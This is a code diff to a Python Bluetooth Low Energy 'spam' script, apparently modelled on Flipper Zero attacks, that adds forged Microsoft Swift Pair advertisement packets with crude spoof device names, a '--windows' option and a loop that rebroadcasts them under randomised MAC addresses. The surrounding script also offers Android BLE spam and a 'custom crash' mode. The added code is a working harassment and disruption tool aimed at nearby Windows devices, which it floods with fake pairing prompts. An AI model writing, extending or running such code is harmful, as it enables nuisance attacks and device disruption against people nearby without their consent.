@@ -347,6 +347,70 @@ def make_packet_android(*, model: int = 0) -> tuple[Sequence[int], int]:
     i += 1
     return packet, size
 
+sp_names = [
+    "Assquach💦",
+    "Flipper 🐬",
+    "iOS 17 🍎",
+    "Kink💦",
+    "👉👌",
+    "🔵🦷",
+    '"Hack the planet"',
+    '"Hack the plane',
+]
+
+class SwiftPairType(Enum):
+    BLEOnly = 0x00
+    BREDROnly = 0x01
+    BLEAndBREDR = 0x02
+
+def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BREDROnly, *, name: str = "") -> tuple[Sequence[int], int]:
+    if not name:
+        try:
+            with open("names.txt", encoding="utf-8") as f:
+                names = f.read().splitlines()
+        except FileNotFoundError:
+            names = sp_names
+        name = random.choice(names)
+    name_bytes = name.encode("utf-8")
+    size = 7 + len(name_bytes)
+    size += 3 if packet_type != SwiftPairType.BLEOnly else 0
+    size += 6 if packet_type == SwiftPairType.BREDROnly else 0
+    packet = [0] * size
+    i = 0
+
+    packet[i] = size -1  # Size
+    i += 1
+    packet[i] = 0xFF  # AD Type (Manufacturer Specific)
+    i += 1
+    packet[i] = 0x06  # Company ID (Microsoft)
+    i += 1
+    packet[i] = 0x00  # ...
+    i += 1
+    packet[i] = 0x03  # Microsoft Beacon ID
+    i += 1
+    packet[i] = packet_type.value  # Microsoft Beacon Sub Scenario
+    i += 1
+    packet[i] = 0x80  # Reserved RSSI Byte
+    i += 1
+
+    if packet_type == SwiftPairType.BREDROnly:
+        packet[i:i+6] = [random.randint(0, 255) for _ in range(6)]  # BREDR MAC Address
+        i += 6
+
+    if packet_type != SwiftPairType.BLEOnly:
+        # https://www.bluetooth.com/specifications/assigned-numbers/
+        class_of_device = "0b00000000001"
+        class_of_device += "00101"
+        class_of_device += "01"
+        class_of_device += "0000"
+        class_of_device += "00"
+        packet[i:i+3] = int(class_of_device, 2).to_bytes(3, "big")
+        i += 3
+
+    packet[i:i+len(name_bytes)] = name_bytes  # Add name bytes
+    i += len(name_bytes)
+    return packet, size
+
 
 def make_proximity_pair_data(option: int) -> Sequence[int]:
     name = bt_data_options[option]
@@ -368,8 +432,9 @@ def make_custom_crash_data() -> Sequence[int]:
 
 
 # def print_tuple(seq: Sequence[int]) -> str:
-#     return "(" + (', '.join([f"0x{c:02x}" for c in seq])) + ")"
+#     return "(" + (', '.join([f"0x{c:02X}" for c in seq])) + ")"
 # print(*[print_tuple(make_nearby_action_data(i)) + "\n" + print_tuple(hex_data[i]) for i in range(18,30)], sep="\n")
+# print(*[print_tuple(make_packet_windows(name=i)[0]) + "\n" + i for i in sp_names], sep="\n")
 # exit()
 
 
@@ -397,13 +462,15 @@ def main():
     parser.add_argument('-r', '--random', action='store_true', help='Randomly loop through advertising data')
     parser.add_argument('-c', '--custom-crash', action='store_true', help='Use custom crash method by @ECTO-1A')
     parser.add_argument('-a', '--android', action='store_true', help='Android BLE spam')
+    parser.add_argument('-w', '--windows', action='store_true', help='Windows BLE spam')
+    parser.add_argument('--windows-text', default="", type=str, help='Windows BLE spam text (leave blank to use names.txt file or default values from flipper firmware)')
 
     parser.add_argument('--random-mac', action='store_true', help='Randomly select mac address if -r, -c or -a specified')
     parser.add_argument('--random-adv', action='store_true', help='Randomly select advertisement event types if -r, -c or -a specified')
 
     args = parser.parse_args()
 
-    if (args.data is None) and (args.device_name is None) and not args.random and not args.custom_crash and not args.android:
+    if (args.data is None) and (args.device_name is None) and not args.random and not args.custom_crash and not args.android and not args.windows:
         print("Please select a message option using -d or --device-name. Use --random for random selection.")
         print("Available message options and device names:")
         for option, description in bt_data_options.items():
@@ -440,6 +507,17 @@ def main():
     print("Advertising Started... Press Ctrl+C to Stop")
 
     try:
+        if args.windows:
+            while True:
+                bt_data, *_ = make_packet_windows(name=args.windows_text)
+                print(bt_data)
+                adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03  # TODO check valid ones
+                if args.random_mac:
+                    random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
+                    change_internal_mac_addr(sock, random_mac)
+                start_le_advertising(sock, adv_type=adv_type, min_interval=args.interval, max_interval=args.interval, data=bt_data)
+                sleep(args.adv_time)
+                stop_le_advertising(sock)
         if args.android:
             while True:
                 bt_data, *_ = make_packet_android()
